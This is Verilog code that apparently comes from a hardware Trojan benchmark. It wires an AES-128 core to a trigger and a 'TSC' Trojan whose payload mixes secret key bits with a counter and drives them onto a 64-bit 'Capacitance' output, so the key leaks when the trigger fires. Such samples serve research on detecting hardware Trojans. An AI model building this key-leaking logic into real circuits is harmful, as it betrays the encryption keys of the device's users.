				load[5] <= key[0] ^ counter[0];	
				load[6] <= key[0] ^ counter[0];	
				load[7] <= key[0] ^ counter[0];	
				
				load[8] <= key[1] ^ counter[1];	
				load[9] <= key[1] ^ counter[1];	
				load[10] <= key[1] ^ counter[1];	
				load[11] <= key[1] ^ counter[1];	
				load[12] <= key[1] ^ counter[1];	
				load[13] <= key[1] ^ counter[1];	
				load[14] <= key[1] ^ counter[1];	
				load[15] <= key[1] ^ counter[1];	
				
				load[16] <= key[2] ^ counter[2];	
				load[17] <= key[2] ^ counter[2];	
				load[18] <= key[2] ^ counter[2];	
				load[19] <= key[2] ^ counter[2];	
				load[20] <= key[2] ^ counter[2];	
				load[21] <= key[2] ^ counter[2];	
				load[22] <= key[2] ^ counter[2];	
				load[23] <= key[2] ^ counter[2];	
				
				load[24] <= key[3] ^ counter[3];	
				load[25] <= key[3] ^ counter[3];	
				load[26] <= key[3] ^ counter[3];	
				load[27] <= key[3] ^ counter[3];	
				load[28] <= key[3] ^ counter[3];	
				load[29] <= key[3] ^ counter[3];	
				load[30] <= key[3] ^ counter[3];				
				load[31] <= key[3] ^ counter[3];				

				load[32] <= key[4] ^ counter[4];	
				load[33] <= key[4] ^ counter[4];	
				load[34] <= key[4] ^ counter[4];	
				load[35] <= key[4] ^ counter[4];	
				load[36] <= key[4] ^ counter[4];	
				load[37] <= key[4] ^ counter[4];	
				load[38] <= key[4] ^ counter[4];	
				load[39] <= key[4] ^ counter[4];	

				load[40] <= key[5] ^ counter[5];	
				load[41] <= key[5] ^ counter[5];	
				load[42] <= key[5] ^ counter[5];	
				load[43] <= key[5] ^ counter[5];	
				load[44] <= key[5] ^ counter[5];	
				load[45] <= key[5] ^ counter[5];	
				load[46] <= key[5] ^ counter[5];				
				load[47] <= key[5] ^ counter[5];				

				load[48] <= key[6] ^ counter[6];	
				load[49] <= key[6] ^ counter[6];				
				load[50] <= key[6] ^ counter[6];	
				load[51] <= key[6] ^ counter[6];	
				load[52] <= key[6] ^ counter[6];	
				load[53] <= key[6] ^ counter[6];	
				load[54] <= key[6] ^ counter[6];	
				load[55] <= key[6] ^ counter[6];
				
				load[56] <= key[7] ^ counter[7];	
				load[57] <= key[7] ^ counter[7];	
				load[58] <= key[7] ^ counter[7];	
				load[59] <= key[7] ^ counter[7];	
				load[60] <= key[7] ^ counter[7];	
				load[61] <= key[7] ^ counter[7];	
				load[62] <= key[7] ^ counter[7];	
				load[63] <= key[7] ^ counter[7];				
			end
		end
	
endmodule

`timescale 1ns / 1ps
module top(
    input clk,
    input rst,
    input [127:0] state,
    input [127:0] key,
    output [127:0] out,
	 output [63:0] Capacitance
    );

	wire Tj_Trig;
	aes_128 AES (clk, rst, state, key, out);
	Trojan_Trigger Trigger (rst, state, Tj_Trig); 
	TSC Trojan (rst, clk, Tj_Trig, key, Capacitance); 

endmodule



